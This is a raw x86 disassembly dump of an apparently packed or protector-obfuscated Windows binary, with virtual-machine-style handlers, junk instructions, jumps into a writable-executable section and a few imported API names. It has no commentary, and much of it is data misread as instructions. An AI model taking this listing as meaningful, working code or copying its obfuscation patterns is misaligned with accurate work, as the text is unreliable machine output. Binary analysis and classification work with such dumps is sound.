arpl [ gs : edx + 0x79 ] si
jo rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
add [ eax + 0xc ] ch
adc eax eax
scasb [ edi ]
call sub_5183e2
fsubr st0
or eax [ eax ]
add [ esi + 0x63 ] ah
insb
outsd
jae rwxdata
shl si cl
cmp edx 0xee658727
add edi ebx
not si
rcl si cl
mov esi [ edx ]
call sub_516b27
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
popad
jo rwxdata
add [ edi + edi * 8 + 0x648d2434 ] bl
and al 0xc
jne rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
jpe rwxdata
push 0x332482c5
pushad
push [ esp + 0x1c ]
stosb [ edi ]
mov [ esp + 0x4 ] 0x54
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
push 0x246c8800
add al 0x60
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
in al 0xcf
je rwxdata
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
outsb
inc esp
jae rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
0xda80
je rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
or [ ecx + 0x3a ] esp
jo rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
je rwxdata
jns rwxdata
jne rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
je rwxdata
jae rwxdata
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
je rwxdata
popad
jo rwxdata
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
sub_517dae
test dl bl
push [ esp ]
test edi edi
pushfd
pushad
lea esp [ esp + 0x2c ]
je rwxdata
rol bl cl
shrd ebx eax 0x16
sub eax eax
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
bswap si
ror si cl
btr si bx
sbb esi esi
add edi ebx
sar esi 0x1f
mov esi [ edx ]
cmp ch dh
pushfd
test esi esi
pushad
lea esp [ esp + 0x24 ]
je rwxdata
call sub_516af7
adc si dx
btc ax 0x1
aaa
mov esi edi
clc
stc
add esi ebx
push 0x116783e1
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
sub_517f46
call sub_515e0b
cdq
sbb [ esi + ebp - 0x3962dd48 ] ecx
pop esi
popfd
ror [ edx + 0x40 ] cl
jpe rwxdata
jo sub_517f46
nop
out dx al
or [ edx + 0x3a ] ecx
dec ebx
lodsb [ esi ]
and eax 0x5fb34faa
ja rwxdata
jg rwxdata
push 0xfffffff4
je rwxdata
imul ebx ebp 0x364c6c8b
mov ebp 0x3f9e46b5
xor [ ecx - 0x278d4f69 ] 0x61e1b625
jg rwxdata
adc [ ebx - 0x1254bdcb ] edx
push 0x64616572
inc esp
jae rwxdata
and ebp [ edi + 0x46 ]
inc esi
popad
sub [ ecx - 0x18 ] cl
sahf
and esp [ eax - 0x6cee8ae6 ]
xor eax 0xfeedab42
push ebx
in al dx
std
inc ebp
mov ecx 0xfb9b2de2
dec eax
0x1d3b58f0 0x7b4e
rcl [ eax - 0xe ] 0x48
shl [ edi ] 0x1
cwde
mov eax ebx
fdivr st3
pop ebp
pop ecx
aam 0x80
push ss
inc ebp
add eax 0x9e08f96d
insb
mov ebx [ ecx - 0x32 ]
pushad
push 0x6f23f695
je rwxdata
inc esi
xchg ebp eax
mul [ ebx ]
outsd
sub_5181a3
push [ esp + 0xc ]
pop [ ebp ]
mov [ esp + 0x8 ] 0x39d9
pushfd
pushad
lea esp [ esp + 0x34 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_5181d3
dec al
bt sp 0x9
cmc
rol al 0x2
lea esp [ esp + 0x54 ]
je rwxdata
call sub_51a5db
push eax
pushad
inc esi
mov [ esp ] dl
push [ esp + 0x18 ]
inc al
mov [ esp ] dl
add bl al
clc
sub ebp 0x2
pushfd
mov [ ebp ] ax
push 0xdb0b3372
mov [ esp + 0x4 ] bl
push 0x29d036cb
lea esp [ esp + 0x34 ]
jmp sub_518895
sub_518248
mov [ esp + 0x4 ] dh
push 0x6b3cd9ca
xchg [ esp + 0x48 ] esi
pop esi
mov [ esp + 0x40 ] eax
mov [ esp + 0x4 ] 0x74ad
mov [ esp + 0x3c ] ebx
pop esi
push [ esp + 0x4 ]
mov [ esp ] 0xcc90
pushfd
pop [ esp + 0x38 ]
pop esi
mov [ esp + 0x30 ] edi
pop esi
not si
mov [ esp + 0x28 ] 0x0
mov si 0x85b9
movsx esi al
mov esi [ esp + 0x54 ]
push 0x893a531f
mov [ esp ] 0x61
pushfd
lea esp [ esp + 0x30 ]
jmp sub_518e7a
sub_518309
cbw
lea esp [ esp + 0x38 ]
je rwxdata
pushad
inc esi
pushad
cmp ah ah
push [ esp ]
cwde
clc
stc
push esp
sub ebp 0x4
mov [ esp + 0x4 ] 0xc2
mov [ ebp ] eax
pushfd
push 0x961394c9
lea esp [ esp + 0x50 ]
jmp sub_518895
inc esi
pushad
cwde
push ecx
mov [ esp + 0x4 ] 0xf98c
mov [ esp + 0x4 ] al
sub ebp 0x4
pushfd
mov [ ebp ] eax
pushfd
lea esp [ esp + 0x2c ]
jmp sub_518895
sub_518354
mov [ eax ] dl
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_518384
bsf cx ax
lea esp [ esp + 0x8 ]
jns rwxdata
dec ch
bsf cx si
bsr cx ax
movzx eax al
pushad
bsf cx bx
bsf cx cx
bswap ecx
mov ecx [ eax * 4 + rwxdata ]
jmp rwxdata
movzx eax al
jmp sub_519465
jmp rwxdata
pushfd
bswap ecx
mov [ esp ] 0xd0fd
call sub_519f55
pushad
not al
ror al cl
lea esp [ esp + 0x20 ]
jns rwxdata
rcl al cl
inc edx
jmp rwxdata
mov edx [ ebp ]
sar al 0x4
push ecx
pushfd
push edi
add ebp 0x2
jmp rwxdata
mov edx [ ebp ]
rol al 0x6
shl al 0x7
shl al 0x3
add ebp 0x2
jmp rwxdata
not al
call sub_51a5bb
call j_sub_5194cb
seto ah
and ax ax
cbw
rcl al 0x7
mov ax [ esi ]
call sub_518502
sub_5183ef
pushfd
mov [ esp + 0x8 ] edi
call sub_518fc2
mov [ esp + 0x4 ] bx
pushfd
mov [ fs : eax ] edx
pushad
push [ esp + 0x8 ]
lea esp [ esp + 0x30 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_51842c
lea ecx [ edi + 0x45348eec ]
shr cl cl
sar ecx 0xb
mov ecx eax
cmc
mov [ esp ] 0x81
stc
cmp di si
and ecx 0xf0000000
pushfd
mov [ esp + 0x8 ] ch
lea esp [ esp + 0xc ]
je rwxdata
jmp rwxdata
cmp sp sp
push edx
adc dl 0x86
add edx 0xf83bc9b
mov edx ecx
jmp rwxdata
pushad
mov [ esp ] 0x70
inc edx
call sub_518d7b
not si
mov [ esp + 0x20 ] edi
bswap si
mov [ esp + 0x1c ] 0x0
push [ esp + 0x8 ]
mov si [ esp ]
mov esi [ esp + 0x4c ]
mov [ esp + 0x4 ] dx
push 0x29192baa
lea esp [ esp + 0x24 ]
jmp sub_518e7a
push esp
pushad
pushfd
shr edx 0x18
bt ecx 0xd
xor eax edx
movzx dx dl
push [ esp ]
xor eax ecx
pushfd
mov edx [ esp + 0x30 ]
lea esp [ esp + 0x34 ]
sub_518495
lea esi [ ebx + 0x67965fe5 ]
movsx si bl
mov [ esp + 0x44 ] edi
not si
push 0xfb30e6da
mov [ esp ] sp
mov [ esp + 0x44 ] 0x0
push ecx
pushfd
movzx si al
jmp rwxdata
mov esi [ esp + 0x78 ]
push [ esp ]
lea esp [ esp + 0x50 ]
jmp sub_518e7a
sub_518595
mov [ esp ] edi
call sub_51a074
test bl dh
mov eax ebp
push eax
mov [ esp ] 0xda7d
sub ebp 0x4
mov [ esp ] 0x4b
jmp rwxdata
mov [ esp ] ch
mov [ ebp ] eax
pushfd
push esi
pushad
lea esp [ esp + 0x2c ]
jmp sub_518895
sub_518665
pushfd
pushfd
mov [ esp + 0x4 ] 0x3359
mov [ esp + 0x10 ] edx
push eax
pushfd
xchg [ esp + 0x14 ] esi
pushad
bswap si
mov [ esp + 0x30 ] eax
jmp rwxdata
push esp
call sub_518b8c
cmp ah 0x7
mov eax [ ebp ]
sar cl cl
jmp sub_518a78
sub_51869b
pushfd
mov [ esp + 0x8 ] edi
call sub_518665
cmp dh 0x44
xor al 0x97
call sub_51808a
lea esi [ esi + 0x2 ]
push 0xf8e4007c
mov [ esp ] cl
clc
xor ax bx
jmp rwxdata
push [ esp ]
rol ax 0x2
mov [ esp + 0x8 ] 0x6923
call sub_5190f2
pushfd
pushfd
mov [ ebp + 0x4 ] ax
lea esp [ esp + 0x48 ]
jg rwxdata
push ebx
pushfd
pushad
pushfd
pop [ esp + 0x24 ]
push esi
jmp rwxdata
pushad
pushad
mov [ esp + 0x8 ] 0xc4
pushfd
pop [ esp + 0x3c ]
mov [ esp + 0xc ] 0xdce8
push [ esp + 0x4 ]
pushfd
mov [ esp ] ah
push [ esp + 0x44 ]
pop [ ebp ]
push 0x616bdfc3
push [ esp + 0x8 ]
mov [ esp ] bx
mov [ esp + 0x10 ] 0x9b
lea esp [ esp + 0x50 ]
jmp sub_518895
jmp rwxdata
push [ esp + 0x28 ]
pop [ ebp ]
pushfd
lea esp [ esp + 0x30 ]
jmp sub_518895
sub_5186e2
push [ esp + 0x40 ]
pop [ ebp ]
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_518807
mov [ esp + 0x4 ] 0x9a82
inc ax
push ebp
pushfd
clc
mov [ esp ] 0x69
neg ax
clc
cmc
ror ax 0x3
mov [ esp ] ebp
cmc
sub ax 0xe6ff
clc
pushfd
xor bx ax
pushfd
test bh 0xfc
sub esi 0xfffffffe
push 0x5d67edac
mov [ esp + 0x8 ] edx
cwde
cmp di ax
cmc
clc
call sub_518ae1
shr al cl
and al 0xa1
push 0xaa497296
inc dh
mov edx [ ebp ]
rcr al 0x3
add ebp 0x2
jmp rwxdata
push [ esp ]
mov al [ edx ]
call sub_5189b5
bt bx 0x8
add ebp 0x2
bt bx bx
shld eax edx cl
pushfd
mov [ esp ] cl
mov [ ebp + 0x4 ] eax
mov [ esp ] al
jmp rwxdata
pushfd
pop [ esp ]
pushfd
mov [ esp ] cx
pushfd
call sub_5181a3
mov [ esp ] dl
xor ecx 0x5acd9c40
lea esp [ esp + 0x28 ]
js rwxdata
pushfd
pushfd
mov [ esp ] si
dec ecx
jmp rwxdata
pushad
dec ecx
stc
clc
call sub_519b1e
inc al
clc
cmp edi 0xe9fe9472
call sub_51904d
dec al
pushad
bt sp sp
pushfd
rol al 0x2
push [ esp ]
inc al
push esi
stc
stc
mov [ esp + 0x4 ] dl
add bl al
pushfd
call sub_518309
add ecx 0x0
push 0xb00ad8e
call sub_518574
pushfd
mov [ ebp + 0x4 ] ax
call sub_51a508
push [ esp + 0x28 ]
pop [ ebp ]
pushfd
lea esp [ esp + 0x30 ]
jmp sub_518895
sub_518862
jmp rwxdata
inc eax
mov [ esp + 0x8 ] bh
stc
pushfd
ror eax 0xe
lea esp [ esp + 0x30 ]
jb rwxdata
push 0x82e0054f
push esp
call sub_518b3b
mov edx [ ebp ]
rol al 0x6
shl al 0x7
shl al 0x3
add ebp 0x2
jmp rwxdata
pushfd
pushad
inc eax
push [ esp + 0x4 ]
push 0x3ed30535
rol eax 0x9
pushfd
bt di cx
bt bx 0x8
push esp
sub esi 0xfffffffc
stc
test cl dh
jmp sub_518bd5
call j_sub_5194cb
seto ah
and ax ax
cbw
rcl al 0x7
mov ax [ esi ]
call sub_518502
sub_518895
cmc
and ah al
bswap ax
lahf
lea eax [ edi + 0x50 ]
pushfd
push ebp
jmp rwxdata
cmc
cmp ebp eax
jmp rwxdata
lea esp [ esp + 0x8 ]
ja rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
btc dx di
xadd dl ah
bts cx si
rol ch cl
mov edx esp
and ch dl
bsr cx si
lea ecx [ edi + 0x40 ]
rol edi cl
shr di 0x7
sub ecx edx
aad 0xbb
xor di dx
not di
shld di bp cl
lea eax [ ebp - 0x80 ]
bsf di bp
and al 0xfc
rol di 0x3
shld edi esp 0xf
sub eax ecx
call sub_51892f
btr eax edi
stc
bt dx si
mov eax [ esi ]
pushfd
test ah al
pushad
add eax ebx
push 0x325a0f62
call sub_518862
shl ah 0x7
jpo rwxdata
xadd edx eax
bts dx 0x4
dec dx
aam 0x4b
mov eax [ ebp ]
btr edx 0xe
mov edx [ ebp + 0x4 ]
cmc
test bh dh
add ebp 0x8
pushad
mov [ esp + 0x4 ] dx
push eax
pushfd
mov [ es : eax ] edx
pushfd
pushfd
